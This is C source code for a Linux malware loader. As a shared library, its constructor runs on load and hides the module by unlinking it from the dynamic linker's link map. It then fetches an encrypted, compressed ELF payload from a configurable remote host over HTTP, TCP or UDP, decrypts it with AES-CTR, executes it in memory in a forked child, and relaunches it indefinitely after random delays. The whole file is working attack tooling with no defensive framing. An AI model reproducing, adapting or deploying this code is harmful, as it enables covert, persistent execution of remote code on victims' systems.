#define _GNU_SOURCE
#include "aes.h"
#include "elf_loader.h"
#include "tinf.h"
#include <dirent.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <link.h>
#include <netdb.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/random.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

/* Configurable Options */
#ifndef DOWNLOAD_HOST
#define DOWNLOAD_HOST ""
#endif /* ifndef MACRO */
#ifndef DOWNLOAD_PORT
#define DOWNLOAD_PORT ""
#endif /* ifndef MACRO */
#ifndef DOWNLOAD_PATH
#define DOWNLOAD_PATH ""
#endif /* ifndef MACRO */
#ifndef DOWNLOAD_KEY
#define DOWNLOAD_KEY ""
#endif /* ifndef MACRO */

#define BUFFER_SIZE 1024

#ifdef DEBUG
#define DEBUG_PRINT(fmt, args...) fprintf(stderr, "DEBUG: " fmt, ##args)
#define DEBUG_PERROR(msg) perror(msg)
#else
#define DEBUG_PRINT(fmt, args...) // Do nothing in release builds
#define DEBUG_PERROR(msg) // Do nothing in release builds
#endif

// forward declarations
size_t decrypt_data(char *data, size_t data_size, const uint8_t *key,
                    const uint8_t *iv);

static volatile sig_atomic_t g_trap_requested = 0;

static void sigtrap_handler(int signo) {
  (void)signo;
  g_trap_requested = 1;
}

static uint32_t rand_u32(void) {
  uint32_t v = 0;
  ssize_t n = getrandom(&v, sizeof(v), 0);
  if (n != (ssize_t)sizeof(v)) {
    v = (uint32_t)time(NULL) ^ (uint32_t)getpid();
  }
  return v;
}

static int rand_range(int min, int max) {
  uint32_t v = rand_u32();
  return min + (v % (uint32_t)(max - min + 1));
}

// build a runnable payload by decrypting and decompressing the stored blob
static int build_payload_from_encrypted(const char *enc_buf, size_t enc_size,
                                        const uint8_t *key, char **out_buf,
                                        size_t *out_size) {
  if (!enc_buf || enc_size <= 16 || !out_buf || !out_size)
    return -1;

  uint8_t iv[16];
  memcpy(iv, enc_buf, 16);
  size_t encrypted_body = enc_size - 16;

  char *cipher = malloc(encrypted_body);
  if (!cipher)
    return -1;
  memcpy(cipher, enc_buf + 16, encrypted_body);
  decrypt_data(cipher, encrypted_body, key, iv);

  unsigned int decomp_size = (unsigned int)encrypted_body * 10;
  char *decomp = NULL;
  int res = TINF_OK;
  for (int attempt = 0; attempt < 3; attempt++) {
    decomp = calloc(decomp_size, sizeof(char));
    if (!decomp) {
      free(cipher);
      return -1;
    }
    res = tinf_uncompress(decomp, &decomp_size, cipher, encrypted_body);
    if (res == TINF_OK)
      break;
    free(decomp);
    decomp = NULL;
    decomp_size *= 2; // try a larger buffer
  }

  free(cipher);
  if (res != TINF_OK || !decomp)
    return -1;

  *out_buf = decomp;
  *out_size = decomp_size;
  return 0;
}

/**
 * Decrypts data using the AES-128-CTR algorithm.
 *
 * @param data The data to decrypt.
 * @param data_size The size of the data.
 * @param key The decryption key.
 * @param iv The initialization vector.
 * @return The size of the decrypted data.
 */
size_t decrypt_data(char *data, size_t data_size, const uint8_t *key,
                    const uint8_t *iv) {
  struct AES_ctx ctx;
  AES_init_ctx_iv(&ctx, key, iv);
  AES_CTR_xcrypt_buffer(&ctx, (uint8_t *)data, data_size);
  return data_size;
}

/**
 * Derives a key from a string.
 *
 * @param str The input string.
 * @param key The derived key.
 */
void derive_key_from_string(const char *str, uint8_t *key) {
  uint32_t temp_key[4] = {0};
  size_t len = strlen(str);
  for (int i = 0; i < 4; i++) {
    for (size_t j = 0; j < len / 4; j++) {
      temp_key[i] ^= ((uint32_t)str[i + j * 4]) << (j % 4 * 8);
    }
  }
  memcpy(key, temp_key, 16);
  DEBUG_PRINT("Derived key: %08x %08x %08x %08x\n", temp_key[0], temp_key[1],
              temp_key[2], temp_key[3]);
}

/**
 * Downloads a file from a specified host and port using different protocols,
 * and decrypts and decompresses it using the provided key.
 *
 * @param host The host to download the file from.
 * @param port The port to connect to.
 * @param path The path of the file on the server (for HTTP only).
 * @param key The decryption key.
 * @param buffer The buffer to write the downloaded data to.
 * @return The size of the decrypted and decompressed data.
 */
size_t download_file(const char *host, const char *port, const char *path,
                     const uint8_t *key, char **buffer) {
  int sockfd;
  struct addrinfo hints, *res, *saved_res = NULL;
  char temp_buffer[BUFFER_SIZE];
  size_t data_size = 0;

  // Prepare the address info
  memset(&hints, 0, sizeof(hints));
  hints.ai_family = AF_UNSPEC;

#ifdef LISTENER_UDP
  hints.ai_socktype = SOCK_DGRAM;
#else
  hints.ai_socktype = SOCK_STREAM;
#endif

  if (getaddrinfo(host, port, &hints, &res) != 0) {
    DEBUG_PERROR("getaddrinfo");
    return 0;
  }
  
  saved_res = res; // Save for UDP sendto

  // Create the socket
  sockfd = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
  if (sockfd == -1) {
    DEBUG_PERROR("socket");
    freeaddrinfo(res);
    return 0;
  }

#ifndef LISTENER_UDP
  // Connect to the server (TCP only)
  if (connect(sockfd, res->ai_addr, res->ai_addrlen) == -1) {
    DEBUG_PERROR("connect");
    close(sockfd);
    freeaddrinfo(res);
    return 0;
  }
  freeaddrinfo(res);
#endif

#ifdef LISTENER_HTTP
  // HTTP protocol - send GET request
  char request[BUFFER_SIZE];
  snprintf(request, sizeof(request),
           "GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", path,
           host);

  if (send(sockfd, request, strlen(request), 0) == -1) {
    DEBUG_PERROR("send");
    close(sockfd);
    return 0;
  }

  // Read the response and skip HTTP headers
  int header_end = 0;
  while (1) {
    ssize_t bytes_received = recv(sockfd, temp_buffer, sizeof(temp_buffer), 0);
    if (bytes_received <= 0) {
      break;
    }

    if (!header_end) {
      char *header_end_ptr = strstr(temp_buffer, "\r\n\r\n");
      if (header_end_ptr) {
        header_end = 1;
        size_t header_length = header_end_ptr - temp_buffer + 4;
        *buffer = realloc(*buffer, data_size + bytes_received - header_length);
        memcpy(*buffer + data_size, temp_buffer + header_length,
               bytes_received - header_length);
        data_size += bytes_received - header_length;
      }
    } else {
      *buffer = realloc(*buffer, data_size + bytes_received);
      memcpy(*buffer + data_size, temp_buffer, bytes_received);
      data_size += bytes_received;
    }
  }
#elif defined(LISTENER_TCP)
  // Raw TCP - read data directly
  while (1) {
    ssize_t bytes_received = recv(sockfd, temp_buffer, sizeof(temp_buffer), 0);
    if (bytes_received <= 0) {
      break;
    }
    *buffer = realloc(*buffer, data_size + bytes_received);
    memcpy(*buffer + data_size, temp_buffer, bytes_received);
    data_size += bytes_received;
  }
#elif defined(LISTENER_UDP)
  // UDP - receive datagrams
  struct sockaddr_storage src_addr;
  socklen_t src_len = sizeof(src_addr);
  
  // Send key hash as authentication request
  uint32_t key_hash = 0;
  for (int i = 0; i < 16; i++) {
    key_hash ^= ((uint32_t)key[i]) << ((i % 4) * 8);
  }
  
  if (sendto(sockfd, &key_hash, sizeof(key_hash), 0, saved_res->ai_addr, saved_res->ai_addrlen) == -1) {
    DEBUG_PERROR("sendto");
    close(sockfd);
    freeaddrinfo(saved_res);
    return 0;
  }
  
  // Receive data in chunks
  while (1) {
    ssize_t bytes_received = recvfrom(sockfd, temp_buffer, sizeof(temp_buffer), 0,
                                      (struct sockaddr *)&src_addr, &src_len);
    if (bytes_received <= 0) {
      break;
    }
    // Check for end marker (4 zero bytes)
    if (bytes_received == 4 && *(uint32_t *)temp_buffer == 0) {
      break;
    }
    *buffer = realloc(*buffer, data_size + bytes_received);
    memcpy(*buffer + data_size, temp_buffer, bytes_received);
    data_size += bytes_received;
  }
  
  freeaddrinfo(saved_res);
#endif

  close(sockfd);

  DEBUG_PRINT("Received data of size: %zu\n", data_size);

  return data_size;
}

/**
 * Trims trailing whitespace from a string.
 *
 * @param buffer The string to trim.
 */
void trim_str(char *buffer) { buffer[strcspn(buffer, "\r\n")] = 0; }

/**
 * Checks if a file exists.
 *
 * @param path The path to the file.
 * @return 1 if the file exists, 0 otherwise.
 */
int is_file_exist(const char *path) { return access(path, F_OK) != -1; }

/**
 * Checks if a string is present in a file.
 *
 * @param path The path to the file.
 * @param str The string to search for.
 * @return 1 if the string is found, 0 otherwise.
 */
int is_str_in_file(const char *path, const char *str) {
  FILE *fd = fopen(path, "r");
  if (!fd)
    return 0;

  char buffer[255];
  while (fgets(buffer, sizeof(buffer), fd)) {
    trim_str(buffer);
    if (strncmp(str, buffer, strlen(str)) == 0) {
      fclose(fd);
      return 1;
    }
  }
  fclose(fd);
  return 0;
}

#ifndef LINUX_EXE
static void unlink_loader() {
  void *handle = dlopen(NULL, RTLD_NOW);
  if (!handle)
    return;

  struct link_map *map = NULL;
  if (dlinfo(handle, RTLD_DI_LINKMAP, &map) != 0) {
    dlclose(handle);
    return;
  }

  Dl_info info;
  if (dladdr(unlink_loader, &info) == 0) {
    dlclose(handle);
    return;
  }

  struct link_map *current = map;
  while (current) {
    if (current->l_addr == (size_t)info.dli_fbase) {
      if (current->l_prev)
        current->l_prev->l_next = current->l_next;
      if (current->l_next)
        current->l_next->l_prev = current->l_prev;
      break;
    }
    current = current->l_next;
  }

  dlclose(handle);
}
#endif

#ifdef LINUX_EXE
void main() {
#else
/**
 * Initializes the library. This function is called when the library is loaded.
 */
void __attribute__((constructor)) initLibrary(void) {
  unlink_loader();
#endif
  // handle SIGCHLD ourselves so we can monitor child status
  signal(SIGCHLD, SIG_DFL);

  struct sigaction trap_sa = {0};
  trap_sa.sa_handler = sigtrap_handler;
  sigemptyset(&trap_sa.sa_mask);
  sigaction(SIGTRAP, &trap_sa, NULL);

  // update with the correct host, port, path, and key string
  const char *host = DOWNLOAD_HOST;
  const char *port = DOWNLOAD_PORT;
  const char *path = DOWNLOAD_PATH;
  const char *key_str = DOWNLOAD_KEY;
  uint8_t key[16];
  derive_key_from_string(key_str, key);
  char *enc_buf = NULL;
  size_t enc_size = download_file(host, port, path, key, &enc_buf);
  if (enc_size == 0) {
    return;
  }

  // keep the encrypted payload for future restarts
  DEBUG_PRINT("Encrypted payload stored: %zu bytes\n", enc_size);

  char *argv[] = {"", NULL};
  // Inherit environment from parent process
  extern char **environ;
  char **envv = environ;

  while (1) {
    g_trap_requested = 0;

    char *payload = NULL;
    size_t payload_size = 0;
    if (build_payload_from_encrypted(enc_buf, enc_size, key, &payload,
                                     &payload_size) != 0) {
      DEBUG_PRINT("Failed to rebuild payload, exiting\n");
      break;
    }

    pid_t child = fork();
    if (child == 0) {
      DEBUG_PRINT("Running ELF...\n");
      elf_run(payload, argv, envv);
      _exit(EXIT_FAILURE);
    }

    free(payload);

    int status = 0;
    while (1) {
      pid_t res = waitpid(child, &status, WNOHANG);
      if (res == child) {
        DEBUG_PRINT("Child exited, status=%d\n", status);
        break;
      }

      if (g_trap_requested) {
        DEBUG_PRINT("Indicator offline trap received, killing child %d\n",
                    child);
        kill(child, SIGKILL);
        waitpid(child, &status, 0);
        break;
      }

      sleep(1);
    }

    int sleep_s = rand_range(180, 480); // at least a few minutes
    DEBUG_PRINT("Sleeping %d seconds before restart\n", sleep_s);
    sleep((unsigned int)sleep_s);
  }
}

#ifdef LINUX_SO
/**
 * Cleans up the library. This function is called when the library is unloaded.
 */
void __attribute__((destructor)) cleanUpLibrary(void) {
  DEBUG_PRINT("Cleaning up library...\n");
}
#endif
